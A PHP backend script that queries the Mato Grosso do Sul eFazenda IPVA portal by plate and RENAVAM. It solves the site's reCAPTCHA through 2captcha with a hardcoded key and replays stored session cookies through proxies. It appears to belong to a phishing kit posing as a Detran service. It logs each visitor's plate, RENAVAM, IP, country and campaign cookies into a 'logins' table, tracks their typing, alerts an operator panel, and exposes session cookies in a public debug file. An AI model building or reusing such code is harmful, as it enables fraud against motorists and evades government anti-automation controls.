<?php
// api/mt2.php - Consulta eFazenda MS (MT2)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$placa = trim((string)($_GET['placa'] ?? ''));
$renavam = trim((string)($_GET['renavam'] ?? ''));

if(!$placa || !$renavam){
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Parâmetros incompletos'
    ]);
    exit;
}

require_once "../db.php";

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
    {
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }
    return $ip_address;
}

function Notifications($mensagem){
    global $pdo;
    $criado_em = date('Y/m/d H:i:s');
    $stmt = $pdo->prepare("INSERT INTO notificacoes (mensagem, criado_em) VALUES (:mensagem, :criado_em)");
    $stmt->execute([':mensagem' => "$mensagem - $criado_em", ':criado_em' => $criado_em]);

    $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio, atual = :atual, hora = :hora WHERE id = :id");
    $updateStmt->execute([':audio' => 5, ':atual' => rand(100000000, 99999999999), ':hora' => $criado_em, ':id' => 1]);
}

function solveCaptcha($key, $sitekey, $pageurl) {
    $ch = curl_init("https://2captcha.com/in.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "key=$key&method=userrecaptcha&googlekey=$sitekey&pageurl=$pageurl");
    $res = curl_exec($ch);
    if (strpos($res, 'OK') !== false) {
        $id = explode('|', $res)[1];
        for ($i = 0; $i < 40; $i++) {
            $ch2 = curl_init("https://2captcha.com/res.php?key=$key&action=get&id=$id");
            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
            $res2 = curl_exec($ch2);
            if (strpos($res2, 'OK') !== false) return explode('|', $res2)[1];
            sleep(3);
        }
    }
    return false;
}

function handleFailure($message) {
    global $pdoGlob;
    try {
        $pdoGlob->prepare("UPDATE conf SET expirado_count = expirado_count + 1 WHERE tela = 'MT2'")->execute();
        Notifications($message);
    } catch (Exception $e) {}
}

// 1. Busca configurações do MT2
$Glob = $pdoGlob->query("SELECT dados FROM conf WHERE tela = 'MT2' LIMIT 1")->fetchColumn();
$dadosConf = json_decode($Glob, true);

$session = $dadosConf['session'] ?? '';
$referer_base = $dadosConf['referer'] ?? 'https://servicos.efazenda.ms.gov.br/ipvapublico/Home/Index';

if (!$session) {
    handleFailure('MT2 >> Sessão expirá-la ou vazia.');
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Sessão expirada. Atualize os cookies no painel.'
    ]);
    exit;
}

// 2. Resolve o Captcha
$sitekey = '6LeRXNwrAAAAAHykZ8dUvsrircjCJ2F-mx7Byu0X';
$captchaKey = '4f16550cac01fcf36238f2e4007822e8';
$captchaToken = solveCaptcha($captchaKey, $sitekey, $referer_base);

if (!$captchaToken) {
    handleFailure('MT2 >> Falha ao resolver o Captcha.');
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Erro ao resolver captcha de segurança.'
    ]);
    exit;
}

// 3. Efetua a requisição de consulta no eFazenda
$ch = curl_init('https://servicos.efazenda.ms.gov.br/ipvapublico/Home');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
apply_proxy_to_curl($ch, 'mt2');

curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://servicos.efazenda.ms.gov.br',
    'Referer: ' . $referer_base,
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
]);
curl_setopt($ch, CURLOPT_COOKIE, $session);

$payload = http_build_query([
    "Placa" => $placa,
    "Renavam" => $renavam,
    "g-recaptcha-response" => $captchaToken
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
$html = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$redirect_url = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
$curl_err = curl_error($ch);
curl_close($ch);

$final_url = 'https://servicos.efazenda.ms.gov.br/ipvapublico/Home';
$was_redirected = false;

if (($http_code == 301 || $http_code == 302) && !empty($redirect_url)) {
    $was_redirected = true;
    if (strpos($redirect_url, 'http') !== 0) {
        $redirect_url = 'https://servicos.efazenda.ms.gov.br' . $redirect_url;
    }
    $final_url = $redirect_url;

    // Efetua segundo request (GET) para obter a página de débitos
    $ch2 = curl_init($redirect_url);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    apply_proxy_to_curl($ch2, 'mt2');
    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Origin: https://servicos.efazenda.ms.gov.br',
        'Referer: ' . $referer_base,
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ]);
    curl_setopt($ch2, CURLOPT_COOKIE, $session);

    $html = curl_exec($ch2);
    $http_code = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
    $curl_err = curl_error($ch2);
    curl_close($ch2);
}

// Salva log de depuração acessível via painel-acesse.xyz/mt2_debug.txt
$debugInfo = [
    'timestamp' => date('Y-m-d H:i:s'),
    'http_code' => $http_code,
    'curl_error' => $curl_err,
    'html_length' => strlen((string)$html),
    'was_redirected' => $was_redirected,
    'final_url' => $final_url,
    'html_sample' => substr((string)$html, 0, 1500),
    'session_cookie' => $session,
    'referer_used' => $referer_base,
    'proxy_config' => get_proxy_config()
];
file_put_contents(__DIR__ . '/../data/mt2_debug.txt', json_encode($debugInfo, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
file_put_contents(__DIR__ . '/../data/mt2_html.html', $html);

if (!$html || (strpos($html, 'card-veiculo') === false && strpos($html, 'Não foram encontrados') === false)) {
    handleFailure('MT2 >> Falha na consulta ou cookies expirados.');
    echo json_encode([
        'IsStatus' => false,
        'message' => 'Não foi possível consultar os débitos. Verifique se os cookies expiraram.'
    ]);
    exit;
}

// 4. Efetua o Parsing do HTML
$dom = new DOMDocument();
@$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
$xpath = new DOMXPath($dom);

// Extração de Placa, Modelo, Chassi
$veiculo_id = "";
$modelo = "VEÍCULO MS";
$chassi = "";

$veiculoNode = $xpath->query("//div[contains(@class, 'card-veiculo')]")->item(0);
if ($veiculoNode) {
    $veiculo_id_raw = $veiculoNode->getAttribute('id'); // cardVeiculo_2515026
    $veiculo_id = str_replace('cardVeiculo_', '', $veiculo_id_raw);
}

$nodesHeader = $xpath->query("//div[contains(@class, 'card-veiculo-header-item')]");
if ($nodesHeader->length >= 4) {
    $modelo = trim(str_replace('Marca/Modelo', '', $nodesHeader->item(1)->textContent));
    $chassi = trim(str_replace('Chassi', '', $nodesHeader->item(3)->textContent));
}

// Extração de Débitos agrupados por Ano
$debitosAgrupados = [];
$totalGeral = 0;

$impostosCards = $xpath->query("//div[contains(@class, 'card-imposto')]");
foreach ($impostosCards as $card) {
    $anoNode = $xpath->query(".//span[contains(@class, 'text-color-fundo-claro-mediumlarge')]", $card)->item(0);
    if (!$anoNode) continue;
    $ano = trim($anoNode->textContent);

    $card_id_raw = $card->getAttribute('id'); // cardVeiculo_2515026_cardVeiculo_30752118
    $quitacao_id = "";
    if (preg_match('/cardVeiculo_\d+_cardVeiculo_(\d+)/', $card_id_raw, $m)) {
        $quitacao_id = $m[1];
    }

    $parcelas = [];
    $linhasParcelas = $xpath->query(".//div[contains(@class, 'card-imposto-parcelas-valores')]", $card);
    foreach ($linhasParcelas as $linha) {
        $checkbox = $xpath->query(".//input[@type='checkbox']", $linha)->item(0);
        if (!$checkbox) continue;

        $check_id_raw = $checkbox->getAttribute('id'); // cardVeiculo_2515026_cardVeiculo_30752118_checkParcela_119312904
        $parcela_id = "";
        if (preg_match('/checkParcela_(\d+)/', $check_id_raw, $m)) {
            $parcela_id = $m[1];
        }

        $valorOriginal = trim($checkbox->getAttribute('value'));

        $spans = $xpath->query(".//span[contains(@class, 'font-main')]", $linha);
        $numero = ($spans->length > 0) ? trim($spans->item(0)->textContent) : "";
        $vencimento = ($spans->length > 1) ? trim($spans->item(1)->textContent) : "";
        $valorExibido = ($spans->length > 2) ? trim($spans->item(2)->textContent) : "";
        $valorExibido = trim(str_replace('R$', '', $valorExibido));

        // Tooltip values
        $tooltip = $xpath->query(".//div[contains(@class, 'card-valores-parcela')]", $linha)->item(0);
        $principal = $valorExibido;
        $multa = "0,00";
        $juros = "0,00";

        if ($tooltip) {
            $rows = $xpath->query(".//div[contains(@class, 'd-flex')]", $tooltip);
            foreach ($rows as $row) {
                $lbl = $xpath->query(".//span[1]", $row)->item(0);
                $val = $xpath->query(".//span[2]", $row)->item(0);
                if ($lbl && $val) {
                    $lblTxt = trim($lbl->textContent);
                    $valTxt = trim(str_replace('R$', '', $val->textContent));
                    if (stripos($lblTxt, 'Principal') !== false) $principal = $valTxt;
                    elseif (stripos($lblTxt, 'Multa') !== false) $multa = $valTxt;
                    elseif (stripos($lblTxt, 'Juros') !== false) $juros = $valTxt;
                }
            }
        }

        $valorDecimal = (float)str_replace(',', '.', str_replace('.', '', $valorOriginal));
        $totalGeral += $valorDecimal;

        $parcelas[] = [
            'id' => $parcela_id,
            'numero' => $numero,
            'vencimento' => $vencimento,
            'valor' => $valorOriginal,
            'principal' => $principal,
            'multa' => $multa,
            'juros' => $juros
        ];
    }

    $debitosAgrupados[] = [
        'ano' => $ano,
        'quitacao_id' => $quitacao_id,
        'parcelas' => $parcelas
    ];
}

$resultadoJson = [
    'placa' => $placa,
    'modelo' => $modelo,
    'renavam' => $renavam,
    'chassi' => $chassi,
    'veiculo_id' => $veiculo_id,
    'debitos' => $debitosAgrupados,
    'totalGeneral' => number_format($totalGeral, 2, ',', '.')
];

$responseEncoded = base64_encode(json_encode($resultadoJson, JSON_UNESCAPED_UNICODE));

// 5. Deleta registros de digitação e salva consulta no banco
$deleteTyping = $pdo->prepare("DELETE FROM logins WHERE (login_info LIKE :login_info_renavam OR login_info LIKE :login_info_placa) AND dados = 'Typing iniciado'");
$deleteTyping->execute([
    ':login_info_renavam' => "%$renavam%",
    ':login_info_placa' => "%$placa%"
]);

$check = $pdo->prepare("SELECT * FROM logins WHERE login_info LIKE :login_info AND resposta <> '' AND resposta IS NOT NULL LIMIT 1");
$check->execute([':login_info' => "%$renavam%"]);
$exists = $check->fetchColumn();

if (!$exists) {
    $debitos = number_format($totalGeral, 2, ',', '.');
    $loginData = [
        ['label' => 'placa', 'value' => $placa],
        ['label' => 'renavam', 'value' => $renavam]
    ];
    $ip_address = get_client_ip();
    $page = 'detran-mt2';

    $pais = 'BR';
    try {
        $DadosIp = json_decode(@file_get_contents("http://ip-api.com/json/$ip_address"));
        if ($DadosIp && isset($DadosIp->country)) {
            $pais = $DadosIp->country;
        }
    } catch (Exception $e) {}

    $identity = $_COOKIE['Identity'] ?? '';      
    $id_usuario = $_COOKIE['campanha'] ?? '';
    $login_info = json_encode($loginData, JSON_UNESCAPED_UNICODE);
    $hora = date('Y-m-d H:i:s');

    $stmt = $pdo->prepare("INSERT INTO logins (page, dados, debitos, ip, pais, identity, hora, login_info, id_usuario, resposta) VALUES 
                            (:page, :dados, :debitos, :ip, :pais, :identity, :hora, :login_info, :id_usuario, :resposta)");

    $is = $stmt->execute([
        ':page'       => $page,
        ':dados'      => $modelo,
        ':debitos'    => $debitos,
        ':ip'         => $ip_address,
        ':pais'       => $pais,
        ':identity'   => $identity,
        ':hora'       => $hora,
        ':login_info' => $login_info,
        ':id_usuario' => $id_usuario,
        ':resposta'   => $responseEncoded
    ]);

    if($is){
        $updateStmt = $pdo->prepare("UPDATE notifications SET audio = :audio, atual = :atual WHERE id = :id");
        $updateStmt->execute([
            ':audio' => 2,
            ':atual' => rand(100000000, 99999999999),
            ':id' => 1
        ]);
    }
}

echo json_encode([
    'IsStatus' => true,
    'dados' => $resultadoJson
]);
